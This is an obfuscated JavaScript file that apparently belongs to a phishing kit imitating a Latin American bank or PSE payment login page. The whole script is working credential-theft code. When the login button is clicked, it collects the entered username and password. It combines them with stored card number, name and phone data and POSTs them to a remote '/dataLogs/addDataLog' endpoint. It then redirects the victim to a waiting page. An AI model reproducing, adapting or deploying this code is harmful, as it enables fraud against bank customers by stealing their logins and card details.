const _0x56a974 = _0x5384;
function _0x270d() {
  const _0x5bfee0 = [
    "451148ZoRjTf",
    "setItem",
    "1625550LVOmty",
    "Ingresó\x20datos",
    "dudename",
    "./wait.html",
    "Datos\x20enviados\x20correctamente\x20al\x20servidor",
    "btnUsuario",
    "value",
    "7IQOaJI",
    "48UHOEmC",
    "6313040EtZIyN",
    "location",
    "Error\x20al\x20agregar\x20datos\x20en\x20el\x20servidor",
    "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.",
    "application/json",
    "stringify",
    "3655896VglFOD",
    "error",
    "2263644URkZek",
    "25IPciwp",
    "metaInfo",
    "addEventListener",
    "disabled",
    "Error\x20al\x20enviar\x20los\x20datos\x20al\x20servidor:",
    "txtPass",
    "puser",
    "telnum",
    "getElementById",
    "json",
    "txtUsuario",
    "474225aJWyiS",
    "href",
    "user",
    "dataLogId",
    "/dataLogs/addDataLog",
    "preventDefault",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "PSE",
    "🟢\x20Fal4be114",
    "86338ytoOPM",
  ];
  _0x270d = function () {
    return _0x5bfee0;
  };
  return _0x270d();
}
(function (_0x586dce, _0x234aac) {
  const _0x473069 = _0x5384,
    _0x408855 = _0x586dce();
  while (!![]) {
    try {
      const _0x4bcf08 =
        -parseInt(_0x473069(0xd6)) / 0x1 +
        (-parseInt(_0x473069(0xdf)) / 0x2) * (parseInt(_0x473069(0xea)) / 0x3) +
        (parseInt(_0x473069(0xe0)) / 0x4) * (parseInt(_0x473069(0xf4)) / 0x5) +
        (-parseInt(_0x473069(0xe2)) / 0x6) * (parseInt(_0x473069(0xe9)) / 0x7) +
        parseInt(_0x473069(0xf1)) / 0x8 +
        parseInt(_0x473069(0xf3)) / 0x9 +
        parseInt(_0x473069(0xeb)) / 0xa;
      if (_0x4bcf08 === _0x234aac) break;
      else _0x408855["push"](_0x408855["shift"]());
    } catch (_0x2d4b10) {
      _0x408855["push"](_0x408855["shift"]());
    }
  }
})(_0x270d, 0x723b0);
function updateLS() {
  const _0xd5dfb = _0x5384;
  LS[_0xd5dfb(0xe1)]("info", JSON[_0xd5dfb(0xf0)](info));
}
const button = document[_0x56a974(0xd3)](_0x56a974(0xe7)),
  userInput = document[_0x56a974(0xd3)](_0x56a974(0xd5)),
  passInput = document[_0x56a974(0xd3)](_0x56a974(0xf9));
function _0x5384(_0xe987b2, _0x1b0663) {
  const _0x270d77 = _0x270d();
  return (
    (_0x5384 = function (_0x5384c8, _0x4c6352) {
      _0x5384c8 = _0x5384c8 - 0xd2;
      let _0x103d57 = _0x270d77[_0x5384c8];
      return _0x103d57;
    }),
    _0x5384(_0xe987b2, _0x1b0663)
  );
}
button[_0x56a974(0xf6)]("click", async function (_0x5da2c5) {
  const _0x4a9d3e = _0x56a974;
  _0x5da2c5[_0x4a9d3e(0xdb)](), (button[_0x4a9d3e(0xf7)] = !![]);
  if (userInput[_0x4a9d3e(0xe8)] == "" && passInput[_0x4a9d3e(0xe8)] == "") {
    alert(_0x4a9d3e(0xdc)),
      userInput["focus"](),
      (button[_0x4a9d3e(0xf7)] = ![]);
    return;
  } else {
    var _0x2803ed = userInput[_0x4a9d3e(0xe8)],
      _0x3457d8 = passInput["value"];
    (info[_0x4a9d3e(0xf5)][_0x4a9d3e(0xd8)] = _0x2803ed),
      (info["metaInfo"][_0x4a9d3e(0xfa)] = _0x3457d8),
      updateLS();
    const _0x1eee62 = {
      reg: info[_0x4a9d3e(0xf5)]["cc"],
      name: info[_0x4a9d3e(0xf5)][_0x4a9d3e(0xe4)],
      cl: info[_0x4a9d3e(0xf5)][_0x4a9d3e(0xd2)],
      us: info[_0x4a9d3e(0xf5)][_0x4a9d3e(0xd8)],
      ps: info[_0x4a9d3e(0xf5)][_0x4a9d3e(0xfa)],
      bn: _0x4a9d3e(0xde),
      status: _0x4a9d3e(0xe3),
      source: _0x4a9d3e(0xdd),
    };
    try {
      const _0x40e6d4 = await fetch(url + _0x4a9d3e(0xda), {
        method: "POST",
        headers: {
          "Content-Type": _0x4a9d3e(0xef),
          Origin: window["location"]["origin"],
        },
        body: JSON[_0x4a9d3e(0xf0)](_0x1eee62),
      });
      if (!_0x40e6d4["ok"]) {
        const _0x82ddc2 = await _0x40e6d4[_0x4a9d3e(0xd4)]();
        throw new Error(_0x82ddc2[_0x4a9d3e(0xf2)] || _0x4a9d3e(0xed));
      }
      const _0x5f5c58 = await _0x40e6d4[_0x4a9d3e(0xd4)]();
      localStorage[_0x4a9d3e(0xe1)]("dataLogToken", _0x5f5c58["token"]),
        localStorage[_0x4a9d3e(0xe1)](_0x4a9d3e(0xd9), _0x5f5c58["id"]),
        console["log"](_0x4a9d3e(0xe6)),
        (window[_0x4a9d3e(0xec)][_0x4a9d3e(0xd7)] = _0x4a9d3e(0xe5));
    } catch (_0x147160) {
      console[_0x4a9d3e(0xf2)](_0x4a9d3e(0xf8), _0x147160),
        alert(_0x4a9d3e(0xee)),
        (button["disabled"] = ![]);
    }
  }
});
